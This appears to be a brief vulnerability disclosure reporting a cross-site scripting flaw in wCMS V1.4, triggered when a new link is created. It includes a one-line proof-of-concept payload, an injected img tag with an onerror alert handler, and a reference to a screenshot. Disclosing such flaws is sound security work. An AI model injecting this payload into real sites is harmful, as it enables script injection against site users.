
target:https://github.com/wCMS/wCMS
version: V1.4

There is an XSS vulnerability in wCMS V1.4 when creating a new link.

POC:
```
"><img src=1 onerror=alert(1)>
```

Accessing Sites and successed
![image](image.png)


